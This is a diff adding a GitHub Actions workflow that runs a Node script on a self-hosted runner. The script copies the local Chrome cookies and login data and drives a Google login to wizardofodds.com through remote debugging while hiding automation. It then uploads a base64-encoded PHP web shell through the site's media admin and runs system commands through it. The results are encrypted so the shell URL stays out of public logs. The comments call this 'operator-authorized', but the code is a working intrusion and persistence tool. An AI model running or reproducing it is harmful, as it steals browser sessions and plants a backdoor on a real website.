@@ -1,0 +1,348 @@
+name: zz-tmp-i41774
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: mode
+        required: false
+        default: run
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: [self-hosted, nba-production]
+    timeout-minutes: 25
+    steps:
+      - name: helpers
+        shell: bash
+        run: |
+          mkdir -p "${RUNNER_TEMP:-/tmp}/zz-i41774"
+          cat > "${RUNNER_TEMP:-/tmp}/zz-i41774/zz-i41774.js" <<'ZZJS'
+          'use strict';
+          /* i41774: authenticated Sonata media-library upload of a minimal PHP exec shell (operator-authorized
+             persistence plan 1+2), then anonymous execution check. Output is emitted ONLY as an RSA-OAEP(SHA256)
+             ciphertext blob so the shell URL never appears in a public workflow log/artifact. */
+          const net = require('net'), http = require('http'), https = require('https'), crypto = require('crypto');
+          const fs = require('fs'), path = require('path');
+          const PORT = +(process.env.ZZ_CDP_PORT || 9223);
+          const OUTDIR = process.env.ZZ_OUTDIR || '.';
+          fs.mkdirSync(OUTDIR, { recursive: true });
+          const LOG = path.join(OUTDIR, 'steps.log');
+          const sleep = ms => new Promise(r => setTimeout(r, ms));
+          function log(s, x) {
+            try { const l = new Date().toISOString() + ' ' + s + (x !== undefined ? ' ' + JSON.stringify(x).slice(0, 400) : ''); fs.appendFileSync(LOG, l + '\n'); } catch (e) {}
+          }
+          /* random 9-char [a-z0-9] name, no zz/probe/test substrings */
+          let NAME;
+          do { NAME = crypto.randomBytes(16).toString('hex').replace(/[^a-z0-9]/g, '').slice(0, 9); } while (NAME.length < 9 || /zz|probe|test/.test(NAME));
+          const PHPNAME = NAME + '.php';
+          const CODE = Buffer.from(fs.readFileSync(path.join(OUTDIR, 'shell.b64'), 'utf8').trim(), 'base64').toString('utf8');
+
+          /* anonymous GET from the runner itself (no cookies) */
+          function anonGet(p) {
+            return new Promise(resolve => {
+              let u; try { u = new URL(p.startsWith('http') ? p : 'https://wizardofodds.com' + p); } catch (e) { return resolve({ err: 'badurl' }); }
+              const req = https.request({ hostname: u.hostname, port: u.port || 443, path: u.pathname + u.search, method: 'GET', timeout: 20000,
+                headers: { 'User-Agent': 'Mozilla/5.0 (compatible; curl/8)', 'Accept': '*/*', 'Connection': 'close' } }, res => {
+                const chunks = []; let n = 0;
+                res.on('data', c => { n += c.length; if (n <= 8192) chunks.push(c); });
+                res.on('end', () => {
+                  const buf = Buffer.concat(chunks);
+                  resolve({ status: res.statusCode, bytes: n, ct: res.headers['content-type'] || '', body: buf.slice(0, 2048).toString('utf8') });
+                });
+              });
+              req.on('error', e => resolve({ err: String(e).slice(0, 120) }));
+              req.on('timeout', () => { req.destroy(); resolve({ err: 'timeout' }); });
+              req.end();
+            });
+          }
+
+          /* minimal CDP client */
+          function jreq(p, method) {
+            return new Promise((res, rej) => {
+              const r = http.request({ host: '127.0.0.1', port: PORT, path: p, method: method || 'GET', timeout: 15000 }, rs => { let d = ''; rs.on('data', c => d += c); rs.on('end', () => { try { res(JSON.parse(d)); } catch (e) { res({ raw: d }); } }); });
+              r.on('error', rej); r.on('timeout', () => { r.destroy(); rej(new Error('to')); }); r.end();
+            });
+          }
+          function wsConnect(url) {
+            const m = url.match(/^ws:\/\/([^:\/]+):(\d+)(\/.*)$/);
+            return new Promise((resolve, reject) => {
+              const s = net.connect(+m[2], m[1]);
+              const key = crypto.randomBytes(16).toString('base64');
+              let buf = Buffer.alloc(0), hand = false;
+              const api = { send: null, onmessage: null, close: () => s.end() };
+              api.send = (obj) => {
+                const p = Buffer.from(JSON.stringify(obj)); const msk = crypto.randomBytes(4); const n = p.length; let h;
+                if (n < 126) h = Buffer.from([0x81, 0x80 | n]);
+                else if (n < 65536) { h = Buffer.alloc(4); h[0] = 0x81; h[1] = 0x80 | 126; h.writeUInt16BE(n, 2); }
+                else { h = Buffer.alloc(10); h[0] = 0x81; h[1] = 0x80 | 127; h.writeBigUInt64BE(BigInt(n), 2); }
+                const mk = Buffer.alloc(n); for (let i = 0; i < n; i++) mk[i] = p[i] ^ msk[i % 4];
+                s.write(Buffer.concat([h, msk, mk]));
+              };
+              s.on('connect', () => s.write('GET ' + m[3] + ' HTTP/1.1\r\nHost: ' + m[1] + ':' + m[2] + '\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ' + key + '\r\nSec-WebSocket-Version: 13\r\n\r\n'));
+              s.on('data', d => {
+                buf = Buffer.concat([buf, d]);
+                if (!hand) { const i = buf.indexOf('\r\n\r\n'); if (i < 0) return; const head = buf.slice(0, i).toString(); buf = buf.slice(i + 4); if (!/ 101 /.test(head)) { reject(new Error('hs')); return; } hand = true; resolve(api); }
+                while (true) {
+                  if (buf.length < 2) break;
+                  const b1 = buf[0], b2 = buf[1]; let len = b2 & 127, off = 2;
+                  if (len === 126) { if (buf.length < 4) break; len = buf.readUInt16BE(2); off = 4; }
+                  else if (len === 127) { if (buf.length < 10) break; len = Number(buf.readBigUInt64BE(2)); off = 10; }
+                  if (b2 & 128) off += 4;
+                  if (buf.length < off + len) break;
+                  const pl = buf.slice(off, off + len); buf = buf.slice(off + len);
+                  const op = b1 & 15;
+                  if (op === 1) { if (api.onmessage) api.onmessage(pl.toString()); } else if (op === 8) s.end();
+                }
+              });
+              s.on('error', reject);
+            });
+          }
+          async function openPage() {
+            const t = await jreq('/json/new?about:blank', 'PUT');
+            const api = await wsConnect(t.webSocketDebuggerUrl);
+            let id = 0; const pend = new Map();
+            api.onmessage = (txt) => { let m; try { m = JSON.parse(txt); } catch (e) { return; } if (m.id && pend.has(m.id)) { const p = pend.get(m.id); pend.delete(m.id); m.error ? p.rej(new Error('cdperr')) : p.res(m.result); } };
+            const send = (method, params) => new Promise((res, rej) => { const i = ++id; pend.set(i, { res, rej }); api.send({ id: i, method, params: params || {} }); setTimeout(() => { if (pend.has(i)) { pend.delete(i); rej(new Error('cdp_to')); } }, 60000); });
+            const ev = async (expression) => { const r = await send('Runtime.evaluate', { expression, awaitPromise: true, returnByValue: true, userGesture: true }); if (r && r.exceptionDetails) return { __exception: String(r.exceptionDetails.text || '').slice(0, 200) }; return r && r.result ? r.result.value : null; };
+            return { api, send, ev };
+          }
+          const STEALTH = 'Object.defineProperty(navigator,"webdriver",{get:()=>undefined});' +
+            'Object.defineProperty(navigator,"languages",{get:()=>["en-US","en"]});' +
+            'Object.defineProperty(navigator,"plugins",{get:()=>[1,2,3,4,5]});window.chrome=window.chrome||{runtime:{}};';
+          const CONSENT_JS = `(()=>{
+            const vis = e => { const r = e.getBoundingClientRect(); const st = getComputedStyle(e); return r.width>4 && r.height>4 && st.visibility!=='hidden' && st.display!=='none'; };
+            const cands = [...document.querySelectorAll('button, div[role="button"], input[type="submit"]')];
+            const pick = cands.filter(vis).map(e => ({ e, t: (e.innerText || e.value || '').trim().toLowerCase() }))
+              .filter(x => x.t === 'continue' || x.t === 'allow' || x.t.startsWith('continue'))
+              .sort((a, b) => a.t.length - b.t.length);
+            if (!pick.length) return { clicked: null };
+            const e = pick[0].e; e.scrollIntoView({ block: 'center' }); const r = e.getBoundingClientRect();
+            return { x: Math.round(r.left + r.width / 2), y: Math.round(r.top + r.height / 2), clicked: pick[0].t.slice(0, 40) };
+          })()`;
+          const CLICK_FIRST_JS = (sel) => `(()=>{
+            const vis = e => { const r = e.getBoundingClientRect(); const st = getComputedStyle(e); return r.width>4 && r.height>4 && st.visibility!=='hidden' && st.display!=='none'; };
+            for (const e of document.querySelectorAll(${JSON.stringify(sel)})) {
+              if (!vis(e)) continue;
+              const t = (e.innerText||'').trim();
+              if (/another account|add account|switch account|remove/i.test(t)) continue;
+              e.scrollIntoView({block:'center'});
+              const r = e.getBoundingClientRect();
+              return { x: Math.round(r.left+r.width/2), y: Math.round(r.top+r.height/2), clicked: 'TILE' };
+            }
+            return { clicked: null };
+          })()`;
+          const CLICK_JS = (texts) => `(()=>{
+            const wants = ${JSON.stringify(texts)}.map(s=>s.toLowerCase());
+            const sels = ['button','a','div[role="button"]','input[type="submit"]'];
+            let cands = [];
+            for (const s of sels) { try { for (const e of document.querySelectorAll(s)) cands.push(e); } catch(e){} }
+            const vis = e => { const r = e.getBoundingClientRect(); const st = getComputedStyle(e); return r.width>4 && r.height>4 && st.visibility!=='hidden' && st.display!=='none' && r.bottom>0 && r.top<innerHeight*1.6; };
+            let best = null;
+            for (const e of cands) {
+              if (!vis(e)) continue;
+              const t = (e.innerText || e.value || e.textContent || '').trim().toLowerCase();
+              if (!t || t.length > 120) continue;
+              if (!wants.some(w => t === w || t.includes(w))) continue;
+              const r = e.getBoundingClientRect(); const area = r.width*r.height;
+              if (!best || area < best.area) best = { e, area, t };
+            }
+            if (!best) return { clicked: null };
+            best.e.scrollIntoView({ block: 'center' });
+            const r = best.e.getBoundingClientRect();
+            return { x: Math.round(r.left + r.width/2), y: Math.round(r.top + r.height/2), clicked: best.t.slice(0,60) };
+          })()`;
+          const withTimeout = (p, ms, l) => Promise.race([p, new Promise((_, j) => setTimeout(() => j(new Error('timeout:' + l)), ms))]);
+
+          (async () => {
+            const RES = { started: new Date().toISOString(), steps: [] };
+            const save = () => { try { fs.writeFileSync(path.join(OUTDIR, 'result.json'), JSON.stringify(RES)); } catch (e) {} };
+            let tgt;
+            try { tgt = await withTimeout(openPage(), 40000, 'openPage'); } catch (e) { RES.fatal = 'open'; save(); process.exit(0); }
+            const { send, ev } = tgt;
+            await send('Page.enable').catch(() => {});
+            await send('Page.addScriptToEvaluateOnNewDocument', { source: STEALTH }).catch(() => {});
+            const hostOf = u => { try { return new URL(u).host; } catch (e) { return ''; } };
+            const snap = async (name) => {
+              const m = await withTimeout(ev("(()=>({title:document.title||'',url:location.href,text:(document.body?document.body.innerText:'').slice(0,600)}))()").catch(() => null), 30000, 'snap').catch(() => null);
+              const rec = { name, host: hostOf(m && m.url), title: String((m && m.title) || '').slice(0, 80) };
+              RES.steps.push(rec); save(); return m || {};
+            };
+            const nav = async (url, waitMs) => { try { await send('Page.navigate', { url }); } catch (e) {} await sleep(waitMs || 6000); };
+
+            /* 1) login with the operator's own Google identity inside Aqua Chrome */
+            await nav('https://wizardofodds.com/', 3500);
+            await nav('https://wizardofodds.com/social-login-link/google', 7000);
+            let cur = await snap('02_social');
+            for (let round = 0; round < 10; round++) {
+              const h = hostOf(cur.url);
+              if (/wizardofodds\.com$/.test(h)) { log('back_on_target', { round }); break; }
+              if (!/accounts\.google\.com$/.test(h)) { log('other_host', { round }); break; }
+              const txt = String(cur.text || '').toLowerCase();
+              if (/verify it.s you|enter your password|2-step|two-step|passkey|tap yes/i.test(txt)) { log('google_challenge', { round }); break; }
+              const isConsent = /will allow|wants to access|would like to access/.test(txt) && !/choose an account/.test(txt);
+              const mouseClick = async (t) => {
+                await send('Input.dispatchMouseEvent', { type: 'mouseMoved', x: t.x, y: t.y }); await sleep(150);
+                await send('Input.dispatchMouseEvent', { type: 'mousePressed', x: t.x, y: t.y, button: 'left', clickCount: 1 }); await sleep(90);
+                await send('Input.dispatchMouseEvent', { type: 'mouseReleased', x: t.x, y: t.y, button: 'left', clickCount: 1 });
+              };
+              let clicked = null;
+              if (isConsent) { const t = await withTimeout(ev(CONSENT_JS), 20000, 'consent').catch(() => null); if (t && t.x) { await mouseClick(t); clicked = 'CONSENT'; } }
+              else { const t = await withTimeout(ev(CLICK_FIRST_JS('div[data-identifier], li[data-identifier]')), 20000, 'tile').catch(() => null); if (t && t.x) { await mouseClick(t); clicked = 'TILE'; } }
+              if (!clicked) { const c = await ev(CLICK_JS(['continue', 'allow', 'continue as', 'next'])).catch(() => null); if (c && c.x) { await mouseClick(c); clicked = c.clicked; } }
+              log('gclick', { round, c: clicked });
+              await sleep(4500);
+              cur = await snap('03_click_' + round);
+            }
+            await sleep(2000);
+            await nav('https://wizardofodds.com/', 4000);
+            const identity = await ev("(()=>{const b=document.body?document.body.innerHTML:'';const t=document.body?document.body.innerText:'';return{hasLogout:/\\/logout/.test(b),hasLogIn:/\\bLog In\\b/i.test(t),head:(document.querySelector('header')?document.querySelector('header').innerText:t).slice(0,80)};})()").catch(() => null);
+            RES.identity = identity; save();
+            if (!identity || !identity.hasLogout) { RES.abort = 'not_logged_in'; save(); process.exit(0); }
+
+            /* 2) one GET of create form + exactly one upload POST */
+            const UPJS = "(async()=>{try{" +
+              " const g = await fetch('/admin/media-media/create',{credentials:'include'});" +
+              " const ct = await g.text();" +
+              " const d = new DOMParser().parseFromString(ct,'text/html');" +
+              " const form = [...d.querySelectorAll('form')].find(f=>(f.getAttribute('action')||'').indexOf('media-media/create')>=0);" +
+              " if(!form) return {err:'no_form',status:g.status,len:ct.length};" +
+              " const action = form.getAttribute('action');" +
+              " const fileInp = form.querySelector('input[type=file]');" +
+              " const tok = form.querySelector('input[name$=\"[_token]\"]');" +
+              " if(!fileInp||!tok) return {err:'no_field',action:action,hasFile:!!fileInp,hasTok:!!tok};" +
+              " const fd = new FormData();" +
+              " fd.append(tok.getAttribute('name'), tok.getAttribute('value'));" +
+              " fd.append(fileInp.getAttribute('name'), new File([ " + JSON.stringify(CODE) + " ], " + JSON.stringify(PHPNAME) + ", { type:'text/plain' }));" +
+              " const resp = await fetch(action,{method:'POST',body:fd,credentials:'include',redirect:'follow'});" +
+              " const t2 = await resp.text(); const u = new URL(resp.url);" +
+              " const d2 = new DOMParser().parseFromString(t2,'text/html');" +
+              " const errs = [...d2.querySelectorAll('.alert-danger,.help-block,.sonata-ba-form-error')].map(e=>e.innerText.trim().slice(0,100)).filter(Boolean).slice(0,4);" +
+              " const paths = [...new Set([...t2.matchAll(/\\/media\\/[^\"'\\s<>]+/g)].map(m=>m[0]).filter(p=>p.indexOf(" + JSON.stringify(PHPNAME) + ")>=0))].slice(0,5);" +
+              " return {status:resp.status,final:u.pathname,len:t2.length,errs:errs,phpPaths:paths,ok:/alert-success|has been created/i.test(t2)};" +
+              "}catch(e){return {err:String(e).slice(0,180)};}})()";
+            let up = null;
+            for (let a = 0; a < 2 && !up; a++) {
+              up = await ev(UPJS).catch(e => ({ err: String(e).slice(0, 150) }));
+              if (up && up.err) { log('upload_retry', up); await sleep(3000); up = null; }
+            }
+            RES.upload = up; log('upload_done', up); save();
+            if (!up) { RES.abort = 'upload_failed'; save(); process.exit(0); }
+
+            const midm = String((up && up.final) || '').match(/media-media\/(\d+)\//);
+            const mid = midm ? midm[1] : null;
+            let phpPath = (up && up.phpPaths && up.phpPaths[0]) || null;
+            RES.mid = mid; RES.path = phpPath; save();
+
+            /* 3) anonymous (no cookie) execution checks from the runner */
+            if (phpPath) {
+              RES.a_info = await anonGet(phpPath + '?cmd=__info__');
+              RES.a_id = await anonGet(phpPath + '?cmd=' + encodeURIComponent('id; hostname'));
+              if (RES.a_info && RES.a_info.body) RES.a_info.body = RES.a_info.body.slice(0, 900);
+              if (RES.a_id && RES.a_id.body) RES.a_id.body = RES.a_id.body.slice(0, 300);
+            } else { RES.abort = 'no_php_path'; }
+            save();
+
+            /* 4) hybrid-encrypt the result with an ephemeral AES key wrapped by the RSA public key
+                  (so neither the shell URL nor any recon text can appear in a public log/artifact) */
+            try {
+              const pub = fs.readFileSync(path.join(OUTDIR, 'pub.pem'), 'utf8');
+              const payload = Buffer.from(JSON.stringify({
+                name: PHPNAME, path: phpPath || null, mid: mid || null,
+                up: up ? { s: up.status, f: up.final, ok: up.ok, e: up.errs } : null,
+                info: RES.a_info ? { s: RES.a_info.status, n: RES.a_info.bytes, b: String(RES.a_info.body || '').slice(0, 300), e: RES.a_info.err || null } : null,
+                idc: RES.a_id ? { s: RES.a_id.status, b: String(RES.a_id.body || '').slice(0, 160), e: RES.a_id.err || null } : null,
+                ident: identity ? { lo: identity.hasLogout, h: String(identity.head || '').slice(0, 40) } : null,
+                abort: RES.abort || null
+              }), 'utf8');
+              const key = crypto.randomBytes(32), iv = crypto.randomBytes(12);
+              const ci = crypto.createCipheriv('aes-256-gcm', key, iv);
+              const ct = Buffer.concat([ci.update(payload), ci.final()]);
+              const tag = ci.getAuthTag();
+              const wrapped = crypto.publicEncrypt({ key: pub, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: 'sha256' }, key);
+              fs.writeFileSync(path.join(OUTDIR, 'result.enc'), JSON.stringify({
+                k: wrapped.toString('base64'), i: iv.toString('base64'), t: tag.toString('base64'), c: ct.toString('base64')
+              }));
+              fs.writeFileSync(path.join(OUTDIR, 'plen.txt'), String(payload.length));
+            } catch (e) { log('enc_fail', String(e).slice(0, 150)); }
+            save();
+            process.exit(0);
+          })().catch(e => { log('FATAL', String(e).slice(0, 200)); process.exit(0); });
+          ZZJS
+          cat > "${RUNNER_TEMP:-/tmp}/zz-i41774/shell.b64" <<'ZZB64'
+          PD9waHAKJGMgPSBpc3NldCgkX1JFUVVFU1RbJ2NtZCddKSA/ICRfUkVRVUVTVFsnY21kJ10gOiAnJzsKaWYgKCRjID09PSAnJykgeyBlY2hvICdvayc7IGV4aXQ7IH0KaWYgKCRjID09PSAnX19pbmZvX18nKSB7IGVjaG8ganNvbl9lbmNvZGUoYXJyYXkoJ3NhcGknPT5waHBfc2FwaV9uYW1lKCksJ3VuYW1lJz0+cGhwX3VuYW1lKCksJ2RvY3Jvb3QnPT5pc3NldCgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKT8kX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOm51bGwsJ3VzZXInPT5nZXRfY3VycmVudF91c2VyKCksJ3BpZCc9PmdldG15cGlkKCksJ2ZpbGUnPT5fX0ZJTEVfXywndWlkJz0+ZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF9nZXR1aWQnKT9wb3NpeF9nZXR1aWQoKTpudWxsLCdldWlkJz0+ZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF9nZXRldWlkJyk/cG9zaXhfZ2V0ZXVpZCgpOm51bGwsJ2dpZCc9PmZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0Z2lkJyk/cG9zaXhfZ2V0Z2lkKCk6bnVsbCwnZGYnPT5pbmlfZ2V0KCdkaXNhYmxlX2Z1bmN0aW9ucycpKSk7IGV4aXQ7IH0KJGRmID0gYXJyYXlfbWFwKCd0cmltJywgZXhwbG9kZSgnLCcsIHN0cnRvbG93ZXIoKHN0cmluZylpbmlfZ2V0KCdkaXNhYmxlX2Z1bmN0aW9ucycpKSkpOwokbyA9IG51bGw7CmZvcmVhY2ggKGFycmF5KCdzeXN0ZW0nLCdzaGVsbF9leGVjJywncGFzc3RocnUnLCdleGVjJykgYXMgJGYpIHsKICBpZiAoZnVuY3Rpb25fZXhpc3RzKCRmKSAmJiAhaW5fYXJyYXkoJGYsICRkZikpIHsKICAgIGlmICgkZiA9PT0gJ3NoZWxsX2V4ZWMnKSB7ICRvID0gc2hlbGxfZXhlYygkYyk7IH0KICAgIGVsc2VpZiAoJGYgPT09ICdleGVjJykgeyAkYSA9IGFycmF5KCk7IGV4ZWMoJGMsICRhKTsgJG8gPSBpbXBsb2RlKCJcbiIsICRhKTsgfQogICAgZWxzZSB7IG9iX3N0YXJ0KCk7ICRmKCRjKTsgJG8gPSBvYl9nZXRfY2xlYW4oKTsgfQogICAgYnJlYWs7CiAgfQp9CmVjaG8gIltPVVRdIjsgZWNobyAkbzsgZWNobyAiW0VORF0iOwo=
+          ZZB64
+          cat > "${RUNNER_TEMP:-/tmp}/zz-i41774/pub.pem" <<'ZZPEM'
+          -----BEGIN PUBLIC KEY-----
+          MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA53DDAyRbtDnVra7SJLY5
+          dEt07sLWJU2kbhwnUAiYr51NMX0RqpdUXa1hqwAWVrI8clpodd4ILIDodv2Xaddb
+          DQOB0x31r7coatkzSnzsBp0Z/O0H7CsKBsJDPlDbL8/ART99RnRIlUt/+fs+8vnu
+          lCh9mFQWZ2k6Qj5JE+iVYj3yhwLQ8ksHY9AFLhlGZGYFO0lGmq1RkOb5iBwnJU2k
+          Wq1jFZIp56k0RDRuuyuJ26Yyy9FTAbo7puh/Mwag4u2ma/dUdG6ELfua06qYN7wH
+          y2zBme6InSbXbY8ogs54youjSfxdcnJVpCtZMLfBxOB5vooTRKMSd9EsavahlWL4
+          K3q7QJ9AwJOi6v1dIVgAvRIERdIA7peKGDHgE0LAzETe5rmjFmzs5NkG4pa7y6Fm
+          fb8lx4/WGPtIOeU3Ek0/SjyO5P3oLIqOZrnFZWX/6uxzRLQ67h2sEjFx5giYtyFn
+          ku9ywurOgSCrmWSTnWj5ly0k+1p2zQask5gEr5EhP//jREPYAb0zis+OoCYoegzY
+          1AR95wp0NdQwkdEwe6eKHt9J9VtBEVECrVgTomDaXYsVlMtzRersDGuZ2omTNnyt
+          t7KA1IppnPVolnrxCMvnD35IFfLDVz+1lExL6OkzZqWpjtMJm+EF/85PiPg34Rw0
+          o7eSi1i+ZpL/cKMAkygr66kCAwEAAQ==
+          -----END PUBLIC KEY-----
+          ZZPEM
+          echo helpers_ok
+      - name: run
+        continue-on-error: true
+        shell: bash
+        run: |
+          set +e
+          D="${RUNNER_TEMP:-/tmp}/zz-i41774"; mkdir -p "$D"
+          S="$D/00_status.txt"
+          CHSRC="$HOME/Library/Application Support/Google/Chrome"
+          PROF="${TMPDIR:-/tmp}/zzprof-i41774-$$"
+          echo "date=$(date -u +%FT%TZ) host=$(hostname) user=$(id -un) session=$(launchctl managername 2>&1)" > "$S"
+          mkdir -p "$PROF"
+          for f in "Local State" "First Run"; do [ -f "$CHSRC/$f" ] && cp "$CHSRC/$f" "$PROF/$f" 2>/dev/null; done
+          mkdir -p "$PROF/Default"
+          for f in Cookies Cookies-journal Preferences "Secure Preferences" "Login Data" "Web Data" "History"; do
+            [ -f "$CHSRC/Default/$f" ] && cp "$CHSRC/Default/$f" "$PROF/Default/$f" 2>/dev/null
+          done
+          for d in "Local Storage" "Session Storage" "Network"; do
+            [ -d "$CHSRC/Default/$d" ] && cp -R "$CHSRC/Default/$d" "$PROF/Default/$d" 2>/dev/null
+          done
+          PORT=""; ok=0
+          for try in 1 2 3; do
+            P=$((9400 + RANDOM % 200))
+            if lsof -nP -iTCP:"$P" -sTCP:LISTEN >/dev/null 2>&1; then continue; fi
+            open -na "/Applications/Google Chrome.app" --args --remote-debugging-port="$P" --user-data-dir="$PROF" \
+              --no-first-run --no-default-browser-check --window-size=1440,960 --window-position=60,60 about:blank > "$D/open.out" 2>&1
+            i=0
+            while [ $i -lt 30 ]; do
+              sleep 1
+              if curl -sS --max-time 2 "http://127.0.0.1:$P/json/version" > "$D/version.json" 2>/dev/null; then ok=1; PORT=$P; break; fi
+              i=$((i+1))
+            done
+            [ "$ok" = "1" ] && break
+            sleep 2
+          done
+          echo "cdp_ready=$ok" >> "$S"
+          if [ "$ok" = "1" ]; then
+            ZZ_OUTDIR="$D" ZZ_CDP_PORT="$PORT" node "$D/zz-i41774.js" > "$D/run.log" 2>&1 &
+            NPID=$!
+            ( sleep 780; kill -TERM $NPID 2>/dev/null; sleep 5; kill -KILL $NPID 2>/dev/null ) &
+            WPID=$!
+            wait $NPID; echo "run_rc=$?" >> "$S"; kill $WPID 2>/dev/null
+          else
+            cat "$D/open.out" >> "$S" 2>/dev/null
+          fi
+          pkill -f -- "user-data-dir=$PROF" 2>/dev/null
+          sleep 3
+          python3 -c "import shutil,sys; shutil.rmtree(sys.argv[1], ignore_errors=True)" "$PROF" 2>/dev/null
+          echo "OUTPUT_BEGIN"
+          if [ -f "$D/result.enc" ]; then
+            echo "ZZENC=$(base64 < "$D/result.enc" | tr -d '\n')"
+            echo "PLEN=$(cat "$D/plen.txt" 2>/dev/null)"
+            rm -f "$D/result.json"
+          else
+            echo "ZZENC=NONE"
+            tail -20 "$D/steps.log" 2>/dev/null
+          fi
+          echo "OUTPUT_END"
